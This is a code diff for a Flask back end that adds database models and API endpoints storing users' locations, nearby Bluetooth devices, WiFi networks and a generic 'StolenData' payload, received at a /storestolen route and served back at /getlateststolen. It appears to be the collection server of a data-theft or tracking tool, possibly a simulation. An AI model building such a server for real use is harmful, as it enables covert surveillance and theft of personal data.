@@ -11,31 +11,128 @@ load_dotenv()
 app = Flask(__name__)
 CORS(app)
 
-# 🛠 Database config
-app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL").replace("postgres://", "postgresql://", 1)
-app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+db_url = os.getenv("DATABASE_URL")
+if not db_url:
+    raise RuntimeError("DATABASE_URL not set in environment.")
+app.config['SQLALCHEMY_DATABASE_URI'] = db_url.replace("postgres://", "postgresql://", 1)
 db = SQLAlchemy(app)
+# ----------------------
+# Database Models
+# ----------------------
+class User(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(255), unique=True)
+    email = db.Column(db.String(255), unique=True)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
 
-# 🧾 Models
+class Location(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    latitude = db.Column(db.Float, nullable=True)
+    longitude = db.Column(db.Float, nullable=True)
+    altitude = db.Column(db.Float)
+    accuracy = db.Column(db.Float)
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
+
+class BluetoothDevice(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    device_name = db.Column(db.String(255))
+    device_mac = db.Column(db.String(17), unique=True)
+    signal_strength = db.Column(db.Integer)
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
+
+class WifiNetwork(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    ssid = db.Column(db.String(255))
+    bssid = db.Column(db.String(17), unique=True)
+    signal_strength = db.Column(db.Integer)
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
+
+# Generic model for "stolen" data
+class StolenData(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    payload = db.Column(db.JSON)
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
+    
 class Report(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     category = db.Column(db.String(80))
     description = db.Column(db.String(200))
-    timestamp = db.Column(db.String(40))
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
 
 class SimulatedEntry(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     device = db.Column(db.String(80))
     os = db.Column(db.String(80))
     clipboard = db.Column(db.String(500))
-    timestamp = db.Column(db.String(40))
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
 
-# 🌍 Latest user location
-latest_location = {"latitude": None, "longitude": None, "timestamp": None}
-
-@app.before_request
+# Ensure tables are created
+@app.before_first_request
 def create_tables():
     db.create_all()
+
+# ----------------------
+# API ROUTES
+# ----------------------
+@app.route("/storestolen", methods=["POST"])
+def store_stolen():
+    data = request.get_json()
+    stolen = StolenData(payload=data)
+    db.session.add(stolen)
+    db.session.commit()
+    return jsonify({"status": "✅ stolen data saved"})
+
+@app.route("/getlateststolen", methods=["GET"])
+def get_latest_stolen():
+    latest = StolenData.query.order_by(StolenData.timestamp.desc()).first()
+    if not latest:
+        return jsonify({"error": "No data found"}), 404
+    return jsonify({"payload": latest.payload, "timestamp": latest.timestamp.isoformat()})
+
+@app.route("/locations/<int:user_id>", methods=["GET"])
+def get_locations_by_user(user_id):
+    locations = Location.query.filter_by(user_id=user_id).all()
+    return jsonify([{
+        "latitude": l.latitude,
+        "longitude": l.longitude,
+        "altitude": l.altitude,
+        "accuracy": l.accuracy,
+        "timestamp": l.timestamp.isoformat()
+    } for l in locations])
+
+@app.route("/users", methods=["GET"])
+def get_all_users():
+    users = User.query.all()
+    return jsonify([{
+        "id": u.id,
+        "username": u.username,
+        "email": u.email,
+        "created_at": u.created_at.isoformat()
+    } for u in users])
+
+@app.route("/bluetooth/<int:user_id>", methods=["GET"])
+def get_bluetooth_by_user(user_id):
+    devices = BluetoothDevice.query.filter_by(user_id=user_id).all()
+    return jsonify([{
+        "device_name": d.device_name,
+        "device_mac": d.device_mac,
+        "signal_strength": d.signal_strength,
+        "timestamp": d.timestamp.isoformat()
+    } for d in devices])
+
+@app.route("/wifi/<int:user_id>", methods=["GET"])
+def get_wifi_by_user(user_id):
+    networks = WifiNetwork.query.filter_by(user_id=user_id).all()
+    return jsonify([{
+        "ssid": n.ssid,
+        "bssid": n.bssid,
+        "signal_strength": n.signal_strength,
+        "timestamp": n.timestamp.isoformat()
+    } for n in networks])
+
 
 @app.route("/")
 def home():
